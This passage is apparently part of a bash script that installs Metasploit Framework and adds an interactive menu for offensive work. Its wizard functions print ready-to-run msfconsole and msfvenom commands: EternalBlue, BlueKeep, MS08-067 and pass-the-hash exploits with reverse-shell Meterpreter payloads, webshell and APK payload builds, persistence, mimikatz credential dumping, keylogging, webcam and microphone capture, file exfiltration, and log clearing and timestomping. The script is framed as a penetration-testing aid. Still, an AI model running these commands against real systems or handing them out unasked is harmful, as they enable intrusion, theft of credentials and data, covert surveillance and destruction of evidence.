    info "Cloning Metasploit Framework from GitHub (~150MB, 5-15 min)..."
    echo ""

    local clone_ok=false
    local attempt=1
    while [[ $attempt -le 3 ]]; do
        info "Clone attempt ${attempt}/3..."
        if git clone --depth=1 --branch "$MSF_BRANCH" \
            https://github.com/rapid7/metasploit-framework.git \
            "$MSF_INSTALL_DIR" 2>&1 | tail -10; then
            clone_ok=true; break
        fi
        [[ $attempt -lt 3 ]] && { warn "Clone failed — retry in 5s"; sleep 5; rm -rf "$MSF_INSTALL_DIR" 2>/dev/null || true; }
        ((attempt++))
    done

    if [[ "$clone_ok" != "true" ]]; then
        warn "Shallow clone failed — trying full clone..."
        rm -rf "$MSF_INSTALL_DIR" 2>/dev/null || true
        if git clone https://github.com/rapid7/metasploit-framework.git "$MSF_INSTALL_DIR" 2>&1 | tail -10; then
            clone_ok=true
            cd "$MSF_INSTALL_DIR"
            git checkout "$MSF_BRANCH" 2>/dev/null || git checkout master 2>/dev/null || true
        fi
    fi

    if [[ "$clone_ok" != "true" ]]; then
        err "Clone failed after all attempts!"
        info "Common causes: network issues, GitHub blocked, disk full, permission denied"
        info "Manual: git clone https://github.com/rapid7/metasploit-framework.git ${MSF_INSTALL_DIR}"
        exit 1
    fi

    log "Metasploit source: ${MSF_INSTALL_DIR}"

    # Verify
    [[ -f "${MSF_INSTALL_DIR}/msfconsole" ]] || { err "Incomplete clone — msfconsole missing!"; exit 1; }
    log "msfconsole entry point verified ✓"
}

#==============================================================================
# PHASE 4 — Install Ruby Gems (Bundler)
#==============================================================================
install_gems() {
    step "Phase 4: Ruby Gems Dependencies"

    cd "$MSF_INSTALL_DIR" || { err "Cannot cd to ${MSF_INSTALL_DIR}"; return 1; }

    local ruby_ver
    ruby_ver=$(ruby -e 'puts RUBY_VERSION' 2>/dev/null || echo "0.0.0")
    info "Ruby version: ${ruby_ver}"

    # --- pg gem ---
    info "Installing pg gem..."
    gem install pg --no-document 2>/dev/null || warn "pg gem install failed — will try via bundler"

    # --- Bundler ---
    info "Installing bundler..."
    gem install bundler -v '~> 2.5' --no-document 2>/dev/null || {
        warn "Bundler ~> 2.5 failed — trying latest..."
        gem install bundler --no-document 2>/dev/null || warn "Bundler install failed — using existing"
    }

    # --- Bundle config ---
    bundle config set --local path 'vendor/bundle' 2>/dev/null || true
    bundle config set --local without 'development test' 2>/dev/null || true
    bundle config set --local jobs "$(nproc 2>/dev/null || echo 4)" 2>/dev/null || true
    bundle config set --local retry 3 2>/dev/null || true

    echo ""
    info "Bundle install — this takes 10-20 minutes (~200 gems)..."
    echo ""

    local bundle_ok=false
    local attempt=1
    while [[ $attempt -le 3 ]]; do
        info "Bundle install attempt ${attempt}/3..."
        if bundle install 2>&1 | tail -25; then
            bundle_ok=true; break
        else
            [[ $attempt -lt 3 ]] && { warn "Bundle install failed — retry in 5s"; sleep 5; bundle config unset path 2>/dev/null || true; bundle config set --local path 'vendor/bundle' 2>/dev/null || true; }
        fi
        ((attempt++))
    done

    if [[ "$bundle_ok" != "true" ]]; then
        warn "Bundle install failed after 3 attempts — trying --deployment..."
        bundle install --deployment 2>&1 | tail -25 || {
            err "Bundle install still failing"
            info "Common causes: network, Ruby < 2.7, missing libs (libpq-dev), disk full"
            info "Manual: cd ${MSF_INSTALL_DIR} && bundle install"
            [[ "$INTERACTIVE" == "true" ]] && ! ask_yesno "Continue despite bundle failure?" "y" && exit 1
            return 1
        }
    fi

    log "Ruby dependencies installed"

    # --- Verify pg gem ---
    if bundle exec ruby -e "require 'pg'; puts 'PG v' + PG::VERSION" 2>/dev/null; then
        log "pg gem verified ✓"
    else
        warn "pg gem not loadable — attempting fix..."
        bundle exec gem install pg --no-document 2>/dev/null || true
        bundle install 2>&1 | tail -10 || true
        bundle exec ruby -e "require 'pg'; puts 'PG v' + PG::VERSION" 2>/dev/null && log "pg gem fixed ✓" || warn "pg gem still problematic — check Ruby/PG compatibility"
    fi

    # --- Verify msf core ---
    bundle exec ruby -e "require 'msf/core'" 2>/dev/null && log "Metasploit core loadable ✓" || warn "msf/core not loadable — may need bundle install after clone"
}

#==============================================================================
# PHASE 5 — Configuration & Launchers
#==============================================================================
create_configs() {
    step "Phase 5: Configuration & Launchers"

    mkdir -p "$MSF_DIR"/{logs,loot,data}

    # --- database.yml (secure permissions) ---
    cat > "${MSF_DIR}/database.yml" << DBEOF
# Metasploit database configuration
# Generated: $(date) | Mode: ${PG_MODE}

development: &shared
  adapter: postgresql
  database: ${MSF_DB}
  username: ${MSF_USER}
  password: ${MSF_PASS}
  host: ${PG_HOST:-127.0.0.1}
  port: ${PG_PORT}
  pool: 10
  timeout: 10
  reconnect: true

production:
  <<: *shared

test:
  <<: *shared
  database: ${MSF_DB}_test
DBEOF
    chmod 600 "${MSF_DIR}/database.yml"
    log "database.yml → ${MSF_DIR}/database.yml (chmod 600)"

    # --- config.yml ---
    cat > "${MSF_DIR}/config.yml" << CFGEOF
# Metasploit global configuration
# Generated: $(date)

workspace: default

# Logging
LogLevel: 3
ConsoleLogging: true
SessionLogging: true
SessionActivityLogging: true
TimestampOutput: true

# Sessions
SessionTlvLogging: true
SessionCommunicationTimeout: 300
SessionRetryTotal: 300
SessionRetryWait: 10

# Meterpreter
MeterpreterPrompt: '%und%um %usr@%host %clr > '
MeterpreterDebugBuild: false
StageEncodingFallback: true

# Handler / Listener
lhost: 0.0.0.0
ReverseConnectRetries: 5
ReverseListenerThreaded: true

# Payload
AutoSystemInfo: true
AutoLoadStdapi: true
AutoVerifySession: true
AutoVerifySessionTimeout: 30

# Exploit
ExitOnSession: false
ExploitTimeout: 600

# Windows target
WindowsMeterpreterUseSSL: true
PayloadUUIDTracking: true
PayloadUUIDName: 'MSF-$(date +%s)'
EnableStageEncoding: true
StageEncoder: x64/xor_dynamic
StageEncodingFallback: true

gather_session_info: true
CFGEOF
    log "config.yml → ${MSF_DIR}/config.yml"

    # --- Launcher: msfconsole (HOME/bin) ---
    mkdir -p "$HOME/bin"

    cat > "$HOME/bin/msfconsole" << 'MSFCONEOF'
#!/usr/bin/env bash
# ======================================
#  msfconsole — Metasploit Launcher
# ======================================

INSTALL_DIR="${MSF_INSTALL_DIR}"
MSF_DIR="${MSF_DIR}"
DB_USER="${MSF_USER}"
DB_PASS="${MSF_PASS}"
DB_HOST="${PG_HOST}"
DB_PORT="${PG_PORT}"
DB_NAME="${MSF_DB}"
PG_MODE="${PG_MODE}"
PG_DATA_DIR="${PG_DATA_DIR}"

# Auto-start PostgreSQL if home mode
if [[ "$PG_MODE" == "home" ]] && [[ -x "$HOME/bin/pg-start" ]]; then
    need_start=false
    if command -v pg_isready &>/dev/null; then
        pg_isready -p "$DB_PORT" -q 2>/dev/null || need_start=true
    else
        PGPASSWORD="$DB_PASS" psql -p "$DB_PORT" -U "$DB_USER" -d "$DB_NAME" -c "SELECT 1" &>/dev/null || need_start=true
    fi
    if [[ "$need_start" == "true" ]]; then
        echo "[*] PostgreSQL not running — auto-starting..."
        "$HOME/bin/pg-start"
        echo ""
    fi
fi

cd "$INSTALL_DIR"

echo "┌─────────────────────────────────────────────┐"
echo "│  Metasploit Framework                       │"
echo "│  DB: ${DB_USER}@${DB_HOST:-localhost}:${DB_PORT}/${DB_NAME}                  │"
echo "└─────────────────────────────────────────────┘"
echo ""
echo "  Type 'db_status' to check database connection"
echo ""

exec bundle exec ./msfconsole "$@"
MSFCONEOF

    # Substitute placeholders
    sed -i "s|\${MSF_INSTALL_DIR}|${MSF_INSTALL_DIR}|g" "$HOME/bin/msfconsole"
    sed -i "s|\${MSF_DIR}|${MSF_DIR}|g" "$HOME/bin/msfconsole"
    sed -i "s|\${MSF_USER}|${MSF_USER}|g" "$HOME/bin/msfconsole"
    sed -i "s|\${MSF_PASS}|${MSF_PASS}|g" "$HOME/bin/msfconsole"
    sed -i "s|\${PG_HOST}|${PG_HOST:-127.0.0.1}|g" "$HOME/bin/msfconsole"
    sed -i "s|\${PG_PORT}|${PG_PORT}|g" "$HOME/bin/msfconsole"
    sed -i "s|\${MSF_DB}|${MSF_DB}|g" "$HOME/bin/msfconsole"
    sed -i "s|\${PG_MODE}|${PG_MODE}|g" "$HOME/bin/msfconsole"
    sed -i "s|\${PG_DATA_DIR}|${PG_DATA_DIR}|g" "$HOME/bin/msfconsole"
    chmod +x "$HOME/bin/msfconsole"

    # --- Launcher: msfvenom ---
    cat > "$HOME/bin/msfvenom" << 'MSFVENEOF'
#!/usr/bin/env bash
INSTALL_DIR="${MSF_INSTALL_DIR}"
cd "$INSTALL_DIR"
exec bundle exec ./msfvenom "$@"
MSFVENEOF
    sed -i "s|\${MSF_INSTALL_DIR}|${MSF_INSTALL_DIR}|g" "$HOME/bin/msfvenom"
    chmod +x "$HOME/bin/msfvenom"

    # --- Launcher: msfdb ---
    cat > "$HOME/bin/msfdb" << 'MSFDBEOF'
#!/usr/bin/env bash
# Metasploit Database Status

echo "╔══════════════════════════════════════════════╗"
echo "║  Metasploit Database Status                  ║"
echo "╚══════════════════════════════════════════════╝"
echo ""
echo "Config file: ${MSF_DIR}/database.yml"
echo ""
cat "${MSF_DIR}/database.yml"
echo ""
echo "──────────────────────────────────────────────"
echo "Quick connect (in msfconsole):"
echo "  db_connect ${MSF_USER}:${MSF_PASS}@${PG_HOST:-127.0.0.1}:${PG_PORT}/${MSF_DB}"
echo ""
echo "PostgreSQL:"
if command -v pg_isready &>/dev/null; then
    pg_isready -p ${PG_PORT} -q 2>/dev/null && echo "  Status: [✓] Running on ${PG_HOST:-localhost}:${PG_PORT}" || echo "  Status: [✗] NOT running (run: pg-start)"
else
    if PGPASSWORD="${MSF_PASS}" psql -p ${PG_PORT} -U ${MSF_USER} -d ${MSF_DB} -c "SELECT 1" &>/dev/null; then
        echo "  Status: [✓] Running on ${PG_HOST:-localhost}:${PG_PORT} (verified via psql)"
    else
        echo "  Status: [?] Unknown — check with pg-start"
    fi
fi
echo ""
echo "Commands:"
echo "  msfconsole     → Start Metasploit"
echo "  msfvenom       → Payload generator"
echo "  msfdb          → Database status"
echo "  pg-start       → Start PostgreSQL"
echo "  pg-stop        → Stop PostgreSQL"
MSFDBEOF
    sed -i "s|\${MSF_DIR}|${MSF_DIR}|g" "$HOME/bin/msfdb"
    sed -i "s|\${MSF_USER}|${MSF_USER}|g" "$HOME/bin/msfdb"
    sed -i "s|\${MSF_PASS}|${MSF_PASS}|g" "$HOME/bin/msfdb"
    sed -i "s|\${PG_HOST}|${PG_HOST:-127.0.0.1}|g" "$HOME/bin/msfdb"
    sed -i "s|\${PG_PORT}|${PG_PORT}|g" "$HOME/bin/msfdb"
    sed -i "s|\${MSF_DB}|${MSF_DB}|g" "$HOME/bin/msfdb"
    chmod +x "$HOME/bin/msfdb"

    # --- Add ~/bin to PATH ---
    if [[ ":$PATH:" != *":$HOME/bin:"* ]]; then
        export PATH="$HOME/bin:$PATH"
        for PROFILE in "$HOME/.bashrc" "$HOME/.zshrc" "$HOME/.profile"; do
            [[ -f "$PROFILE" ]] && ! grep -q 'PATH.*\$HOME/bin' "$PROFILE" 2>/dev/null && echo 'export PATH="$HOME/bin:$PATH"' >> "$PROFILE"
        done
    fi

    log "Launchers: ~/bin/msfconsole, ~/bin/msfvenom, ~/bin/msfdb"
    [[ "$PG_MODE" == "home" ]] && log "PostgreSQL: ~/bin/pg-start, ~/bin/pg-stop"
}

#==============================================================================
# PHASE 6 — Verification
#==============================================================================
verify_installation() {
    step "Phase 6: Verification"

    local PASS=0 FAIL=0

    check() {
        local desc="$1"; shift
        if eval "$@" &>/dev/null; then
            echo -e "  ${GREEN}[✓]${NC} ${desc}"
            ((PASS++)) || true
        else
            echo -e "  ${RED}[✗]${NC} ${desc}"
            ((FAIL++)) || true
        fi
    }

    # PostgreSQL
    if command -v pg_isready &>/dev/null; then
        check "PostgreSQL running" "pg_isready -p ${PG_PORT} -q"
    else
        warn "pg_isready not found — skipping running check"
        if [[ -n "$MSF_PASS" ]]; then
            check "DB connection (password)" "PGPASSWORD='${MSF_PASS}' psql -p ${PG_PORT} -U ${MSF_USER} -d ${MSF_DB} -c 'SELECT 1'"
        else
            check "DB connection (trust)" "psql -p ${PG_PORT} -U ${MSF_USER} -d ${MSF_DB} -c 'SELECT 1'"
        fi
    fi

    if [[ -n "$MSF_PASS" ]]; then
        check "DB connection (password auth)" "PGPASSWORD='${MSF_PASS}' psql -p ${PG_PORT} -U ${MSF_USER} -d ${MSF_DB} -c 'SELECT 1'"
    else
        check "DB connection (trust auth)" "psql -p ${PG_PORT} -U ${MSF_USER} -d ${MSF_DB} -c 'SELECT 1'"
    fi

    check "Ruby interpreter" "ruby --version"
    check "PostgreSQL Ruby gem" "ruby -e 'require \"pg\"' 2>/dev/null"
    check "Metasploit source" "[ -d ${MSF_INSTALL_DIR}/lib ]"
    check "msfconsole" "[ -f ${MSF_INSTALL_DIR}/msfconsole ]"
    check "msfvenom" "[ -f ${MSF_INSTALL_DIR}/msfvenom ]"
    check "database.yml" "[ -f ${MSF_DIR}/database.yml ]"
    check "config.yml" "[ -f ${MSF_DIR}/config.yml ]"
    check "msfconsole launcher" "[ -x $HOME/bin/msfconsole ]"

    echo ""
    echo -e "  ${BOLD}Results: ${GREEN}${PASS} passed${NC} / ${RED}${FAIL} failed${NC} (of $((PASS+FAIL)))${NC}"

    if [[ "$FAIL" -gt 0 ]]; then
        echo ""
        warn "Some checks failed — see above for details"
        warn "Run 'msfdb' for database diagnostics"
    fi
}

#==============================================================================
# FINAL SUMMARY
#==============================================================================
print_summary() {
    echo ""
    echo -e "${RED}${BOLD}  ╔══════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}  ║     ▄▄▄ ▄▄▄ ▄▄▄ ▄ ▄▄▄ ▄▄▄  ── SETUP COMPLETE       ║${NC}"
    echo -e "${RED}${BOLD}  ║     ███ ███ ███ █ ███ ███                          ║${NC}"
    echo -e "${RED}${BOLD}  ╚══════════════════════════════════════════════════════╝${NC}"
    echo ""

    cat << SUMMARY
  ${BOLD}▸ Start Metasploit:${NC}
      ${GREEN}msfconsole${NC}

  ${BOLD}▸ Inside msfconsole:${NC}
      db_status                 → Check database connection
      workspace -a <project>    → Create new workspace
      workspace <project>       → Switch workspace
      search <keyword>          → Search modules
      use <module>              → Use module
      show options              → Show module options
      hosts                     → Discovered hosts
      services                  → Discovered services

  ${BOLD}▸ Tools:${NC}
      msfconsole                → Metasploit console
      msfvenom                  → Payload generator
      msfdb                     → Database status & info
SUMMARY

    if [[ "$PG_MODE" == "home" ]]; then
        cat << SUMMARY2
      pg-start                  → Start PostgreSQL
      pg-stop                   → Stop PostgreSQL
SUMMARY2
    fi

    cat << SUMMARY3

  ${BOLD}▸ Config files:${NC}
      ~/.msf4/database.yml      → Database connection (chmod 600)
      ~/.msf4/config.yml        → Global settings
      ~/.msf4/logs/             → Session logs
      ~/.msf4/loot/             → Loot files

  ${BOLD}▸ Database:${NC}
      Host:     ${PG_HOST:-localhost}:${PG_PORT}
      User:     ${MSF_USER}
      Database: ${MSF_DB}
      Password: $([[ -n "$MSF_PASS" ]] && echo "*****" || echo "(none — trust auth)")

  ${BOLD}▸ Update Metasploit:${NC}
      cd ${MSF_INSTALL_DIR}
      git pull && bundle install

  ${BOLD}▸ Troubleshooting:${NC}
      msfdb                     → Check status & config
      psql -p ${PG_PORT} -U ${MSF_USER} -d ${MSF_DB}
SUMMARY3

    echo ""
    echo -e "  ${YELLOW}${BOLD}Run:${NC} ${GREEN}source ~/.bashrc && msfconsole${NC}"
    echo ""
}

#==============================================================================
# QUICK-START MENU — Delegates to external modules when available
#==============================================================================
print_quickstart_menu() {
    echo ""
    echo -e "${CYAN}${BOLD}════════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}${BOLD}                    QUICK-START MENU — METASPLOIT                     ${NC}"
    echo -e "${CYAN}${BOLD}════════════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${BOLD}1) 🔍 RECONNAISSANCE — Network Mapping${NC}"
    echo -e "     ${DIM}Port scan, service enumeration, OS detection, vulnerability scan${NC}"
    echo ""
    echo -e "  ${BOLD}2) ⚔️  EXPLOITATION — Attack Vulnerabilities${NC}"
    echo -e "     ${DIM}Run exploits, payload delivery, meterpreter sessions${NC}"
    echo ""
    echo -e "  ${BOLD}3) 🎯 POST-EXPLOITATION — Sustained Access${NC}"
    echo -e "     ${DIM}Privilege escalation, persistence, pivoting, data exfiltration${NC}"
    echo ""
    echo -e "  ${BOLD}4) 📋 FULL CHEATSHEET${NC}"
    echo -e "     ${DIM}Complete command reference: Recon / Exploit / Post-Exploit / msfvenom${NC}"
    echo ""
    echo -e "  ${BOLD}5) 📖 PRACTICAL RUNBOOKS — Copy-Paste Ready${NC}"
    echo -e "     ${DIM}3-phase examples: Recon → Exploit → Post-Exploit (save as .rc/.md)${NC}"
    echo ""
    echo -e "  ${BOLD}6) 🚀 LAUNCH MSFCONSOLE${NC}"
    echo -e "     ${DIM}Go directly to console${NC}"
    echo ""
    echo -e "  ${BOLD}7) 🏢 PROFESSIONAL PENTEST FRAMEWORK — 5 Phases${NC}"
    echo -e "     ${DIM}PTES/NIST/OSSTMM: Recon→Scan→Exploit→Post-Exploit→Report${NC}"
    echo -e "     ${DIM}Import Nessus/Nmap/OpenVAS, OPSEC checklist, MITRE ATT&CK mapping${NC}"
    echo ""
    echo -e "  ${BOLD}0) Exit${NC}"
    echo ""

    if [[ "$INTERACTIVE" == "true" ]]; then
        local choice
        read -r -p "  [?] Choose (1-7, 0=exit): " choice
        case "$choice" in
            1) run_recon_wizard ;;
            2) run_exploit_wizard ;;
            3) run_postexploit_wizard ;;
            4)
                if declare -f show_cheatsheet &>/dev/null; then show_cheatsheet; else warn "Cheatsheet module not loaded"; fi
                ;;
            5)
                if declare -f run_runbook_menu &>/dev/null; then run_runbook_menu; else warn "Runbooks module not loaded"; fi
                ;;
            6) launch_msfconsole ;;
            7)
                if declare -f run_professional_framework_menu &>/dev/null; then run_professional_framework_menu; else warn "Professional framework module not loaded"; fi
                ;;
            0|*) echo ""; info "Done. Run 'msfconsole' anytime." ;;
        esac
    fi
}

#==============================================================================
# WIZARDS (kept inline for interactive use — minimal, no big reference content)
#==============================================================================

run_recon_wizard() {
    echo ""
    echo -e "${BLUE}${BOLD}═══ RECONNAISSANCE ═══${NC}"
    echo ""
    read -r -p "  [?] Target (IP/CIDR/hostname): " RECON_TARGET
    [[ -z "$RECON_TARGET" ]] && { warn "Empty target"; return; }

    echo ""
    echo -e "  ${BOLD}Scan type:${NC}"
    echo -e "    ${GREEN}1)${NC} Quick Port Scan (nmap -sS -T4)"
    echo -e "    ${GREEN}2)${NC} Full Port Scan (nmap -p- -sS -T4)"
    echo -e "    ${GREEN}3)${NC} Service Version + OS (nmap -sV -O)"
    echo -e "    ${GREEN}4)${NC} Vulnerability Scan (nmap --script vuln)"
    echo -e "    ${GREEN}5)${NC} SMB/NetBIOS Enum"
    echo -e "    ${GREEN}6)${NC} Web App Scan (nikto/nmap http-enum)"
    echo -e "    ${GREEN}7)${NC} Comprehensive (all above)"
    echo ""
    read -r -p "  [?] Choose (1-7): " RECON_CHOICE

    local NMAP_CMD=""
    case "$RECON_CHOICE" in
        1) NMAP_CMD="nmap -sS -T4 -oA recon_quick_${RECON_TARGET//\//_} ${RECON_TARGET}" ;;
        2) NMAP_CMD="nmap -p- -sS -T4 -oA recon_full_${RECON_TARGET//\//_} ${RECON_TARGET}" ;;
        3) NMAP_CMD="nmap -sV -O -oA recon_svc_${RECON_TARGET//\//_} ${RECON_TARGET}" ;;
        4) NMAP_CMD="nmap --script vuln -oA recon_vuln_${RECON_TARGET//\//_} ${RECON_TARGET}" ;;
        5) NMAP_CMD="nmap --script 'smb-enum*,smb-os-discovery' -p 139,445 -oA recon_smb_${RECON_TARGET//\//_} ${RECON_TARGET}" ;;
        6)
            if command -v nikto &>/dev/null; then
                info "Running nikto..."
                nikto -h "${RECON_TARGET}" 2>&1 | head -60
            else
                warn "nikto not installed — using nmap http-enum"
                NMAP_CMD="nmap --script http-enum,http-headers,http-robots.txt -p 80,443,8080,8443 -oA recon_web_${RECON_TARGET//\//_} ${RECON_TARGET}"
            fi
            ;;
        7) NMAP_CMD="nmap -p- -sS -sV -O --script vuln -oA recon_all_${RECON_TARGET//\//_} ${RECON_TARGET}" ;;
        *) warn "Invalid"; return ;;
    esac

    [[ -n "$NMAP_CMD" ]] && {
        echo ""
        info "Running: ${NMAP_CMD}"
        echo ""
        eval "$NMAP_CMD"
        echo ""
        log "Scan complete. Results saved to output files."
        log "Import to Metasploit: msfconsole -x 'db_import *.xml'"
    }
}

run_exploit_wizard() {
    echo ""
    echo -e "${RED}${BOLD}═══ EXPLOITATION ═══${NC}"
    echo ""
    echo -e "  ${BOLD}Exploit type:${NC}"
    echo -e "    ${GREEN}1)${NC} EternalBlue (MS17-010) — SMBv1 RCE"
    echo -e "    ${GREEN}2)${NC} BlueKeep (CVE-2019-0708) — RDP RCE"
    echo -e "    ${GREEN}3)${NC} MS08-067 — NetAPI RCE (Legacy Windows)"
    echo -e "    ${GREEN}4)${NC} PsExec / Pass-the-Hash — SMB with creds"
    echo -e "    ${GREEN}5)${NC} Generate Payload (msfvenom)"
    echo ""
    read -r -p "  [?] Choose (1-5): " EXP_CHOICE

    echo ""
    read -r -p "  [?] Target IP: " EXP_TARGET
    [[ -z "$EXP_TARGET" ]] && { warn "Empty target"; return; }
    read -r -p "  [?] LHOST (your IP): " EXP_LHOST
    [[ -z "$EXP_LHOST" ]] && EXP_LHOST=$(ip route get 1 2>/dev/null | awk '{print $7; exit}')
    read -r -p "  [?] LPORT [4444]: " EXP_LPORT
    EXP_LPORT="${EXP_LPORT:-4444}"

    case "$EXP_CHOICE" in
        1)
            cat << EXPEOF

${BOLD}═══ ETERNALBLUE (MS17-010) ═══${NC}

Run in msfconsole:
  use exploit/windows/smb/ms17_010_eternalblue
  set RHOSTS ${EXP_TARGET}
  set LHOST ${EXP_LHOST}
  set LPORT ${EXP_LPORT}
  set PAYLOAD windows/x64/meterpreter/reverse_tcp
  exploit

Payload (terminal):
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${EXP_LHOST} LPORT=${EXP_LPORT} -f exe -o eternalblue.exe
EXPEOF
            ;;
        2)
            cat << EXPEOF

${BOLD}═══ BLUEKEEP (CVE-2019-0708) ═══${NC}

  use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
  set RHOSTS ${EXP_TARGET}
  set LHOST ${EXP_LHOST}
  set LPORT ${EXP_LPORT}
  set PAYLOAD windows/x64/meterpreter/reverse_tcp
  exploit
EXPEOF
            ;;
        3)
            cat << EXPEOF

${BOLD}═══ MS08-067 NETAPI ═══${NC}

  use exploit/windows/smb/ms08_067_netapi
  set RHOST ${EXP_TARGET}
  set LHOST ${EXP_LHOST}
  set LPORT ${EXP_LPORT}
  set PAYLOAD windows/meterpreter/reverse_tcp
  exploit
EXPEOF
            ;;
        4)
            read -r -p "  [?] SMB Username: " SMB_USER
            read -r -p "  [?] SMB Password/Hash: " SMB_PASS
            cat << EXPEOF

${BOLD}═══ PSEXEC / PASS-THE-HASH ═══${NC}

# With password:
  use exploit/windows/smb/psexec
  set RHOSTS ${EXP_TARGET}
  set SMBUser ${SMB_USER}
  set SMBPass ${SMB_PASS}
  set PAYLOAD windows/x64/meterpreter/reverse_tcp
  set LHOST ${EXP_LHOST}
  set LPORT ${EXP_LPORT}
  exploit

# Pass-the-Hash:
  use exploit/windows/smb/psexec
  set RHOSTS ${EXP_TARGET}
  set SMBUser ${SMB_USER}
  set SMBPass aad3b435b51404eeaad3b435b51404ee:${SMB_PASS}
  set SMBDomain .
  set PAYLOAD windows/x64/meterpreter/reverse_tcp
  set LHOST ${EXP_LHOST}
  set LPORT ${EXP_LPORT}
  exploit
EXPEOF
            ;;
        5)
            cat << EXPEOF

${BOLD}═══ MSFVENOM PAYLOADS ═══${NC}

# Windows x64 Meterpreter Reverse TCP
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${EXP_LHOST} LPORT=${EXP_LPORT} -f exe -o payload.exe

# Windows x64 Meterpreter Reverse HTTPS (stealthier)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=${EXP_LHOST} LPORT=${EXP_LPORT} -f exe -o payload_https.exe

# Linux x64 Meterpreter Reverse TCP
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${EXP_LHOST} LPORT=${EXP_LPORT} -f elf -o payload.elf

# Android APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=${EXP_LHOST} LPORT=${EXP_LPORT} -o payload.apk

# Webshells
msfvenom -p php/meterpreter/reverse_tcp LHOST=${EXP_LHOST} LPORT=${EXP_LPORT} -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=${EXP_LHOST} LPORT=${EXP_LPORT} -f raw -o shell.jsp

# Listener for all:
msfconsole -x "use exploit/multi/handler; set PAYLOAD <payload>; set LHOST ${EXP_LHOST}; set LPORT ${EXP_LPORT}; exploit"
EXPEOF
            ;;
        *) warn "Invalid"; return ;;
    esac
}

run_postexploit_wizard() {
    echo ""
    echo -e "${MAGENTA}${BOLD}═══ POST-EXPLOITATION ═══${NC}"
    echo ""
    echo -e "  ${BOLD}Choose module:${NC}"
    echo -e "    ${GREEN}1)${NC} Privilege Escalation (local exploit suggester)"
    echo -e "    ${GREEN}2)${NC} Persistence (registry, service, WMI, scheduled task)"
    echo -e "    ${GREEN}3)${NC} Credential Harvesting (kiwi/mimikatz, hashdump, browsers)"
    echo -e "    ${GREEN}4)${NC} Lateral Movement (pivoting, PsExec, WMI, Pass-the-Hash)"
    echo -e "    ${GREEN}5)${NC} Data Exfiltration (screenshot, keylogger, download, search)"
    echo -e "    ${GREEN}6)${NC} Cleanup & Anti-Forensics (clearev, timestomp, artifact removal)"
    echo -e "    ${GREEN}7)${NC} Full Post-Exploit Cheatsheet"
    echo ""
    read -r -p "  [?] Choose (1-7): " POST_CHOICE

    case "$POST_CHOICE" in
        1) cat << 'EOF'
═══ PRIVILEGE ESCALATION ═══
# Windows:
  run post/multi/recon/local_exploit_suggester
  use exploit/windows/local/bypassuac_eventvwr
  use exploit/windows/local/token_duplication
  use exploit/windows/local/ms16_032_secondary_logon_handle
  use exploit/windows/local/always_install_elevated

# Linux:
  run post/multi/recon/local_exploit_suggester
  use exploit/linux/local/dirty_cow
  use exploit/linux/local/pkexec
  use exploit/linux/local/sudo_baron_samedit
EOF
            ;;
        2) cat << 'EOF'
═══ PERSISTENCE ═══
# Registry (auto-run):
  run persistence -X -i 60 -p windows/x64/meterpreter/reverse_tcp -r LHOST
  # -X = auto-start, -i = interval seconds, -S = SYSTEM (HKLM)

# Service:
  use exploit/windows/local/service_persistence

# WMI (fileless):
  use exploit/windows/local/wmi_persistence

# Scheduled Task:
  use exploit/windows/local/scheduled_task_persistence

# Linux SSH key:
  run post/linux/manage/sshkey_persistence
EOF
            ;;
        3) cat << 'EOF'
═══ CREDENTIAL HARVESTING ═══
# Windows (Kiwi/Mimikatz):
  load kiwi
  creds_all
  lsa_dump_sam
  lsa_dump_secrets
  hashdump
  run post/windows/gather/hashdump
  run post/windows/gather/enum_chrome
  run post/windows/gather/enum_firefox
  run post/windows/gather/wifi_profiles_passwords

# Linux:
  run post/linux/gather/hashdump
  run post/linux/gather/enum_users_history
EOF
            ;;
        4) cat << 'EOF'
═══ LATERAL MOVEMENT ═══
# Pivoting:
  run autoroute -s 192.168.10.0/24
  use auxiliary/server/socks_proxy; set SRVPORT 1080; run
  # proxychains nmap -sT 192.168.10.50

# PsExec:
  use exploit/windows/smb/psexec
  use exploit/windows/smb/psexec_psh

# WMI:
  use exploit/windows/wmi/wmi_exec

# Pass-the-Hash:
  use exploit/windows/smb/psexec
  set SMBPass <NTLM_hash>; set SMBDomain .
EOF
            ;;
        5) cat << 'EOF'
═══ DATA EXFILTRATION ═══
  screenshot
  keyscan_start; sleep 60; keyscan_dump; keyscan_stop
  download "C:\\Users\\Admin\\secret.pdf" /tmp/
  search -f "*.pdf" -d "C:\\Users"
  record_mic -d 30
  webcam_snap
EOF
            ;;
        6) cat << 'EOF'
═══ CLEANUP & ANTI-FORENSICS ═══
  clearev
  timestomp "C:\\path\\file.exe" -v "C:\\Windows\\System32\\kernel32.dll"
  run post/windows/manage/cleanup
  run post/windows/manage/sdelete
  run post/windows/manage/delete_scheduled_task
  run post/windows/manage/delete_service
  run post/windows/manage/cleanup_logs
EOF
            ;;
        7)
            if declare -f show_postexploit_cheatsheet &>/dev/null; then show_postexploit_cheatsheet; else warn "Post-exploit cheatsheet module not loaded"; fi
            ;;
        *) warn "Invalid"; return ;;
    esac
}

#==============================================================================
# MSFCONSOLE LAUNCHER
#==============================================================================
launch_msfconsole() {
    echo ""
    if [[ -x "$HOME/bin/msfconsole" ]]; then
        info "Launching msfconsole via ~/bin/msfconsole..."
        exec "$HOME/bin/msfconsole"
    elif [[ -f "$MSF_INSTALL_DIR/msfconsole" ]]; then
        info "Launching from installation..."
        cd "$MSF_INSTALL_DIR"
        exec bundle exec ./msfconsole
    elif command -v msfconsole &>/dev/null; then
        info "Launching system msfconsole..."
        exec msfconsole
    else
        err "msfconsole not found!"
        warn "Checked: ~/bin/msfconsole, ${MSF_INSTALL_DIR}/msfconsole, system PATH"
        info "Manual: cd ${MSF_INSTALL_DIR} && bundle exec ./msfconsole"
    fi
}

#==============================================================================
# MAIN EXECUTION
#==============================================================================
main() {
    # Non-interactive mode
    if [[ "${1:-}" == "--no-interactive" ]] || [[ "${1:-}" == "--auto" ]]; then
        INTERACTIVE=false
        info "Non-interactive mode (defaults)"

        MSF_PASS="${MSF_PASS:-msfpass}"
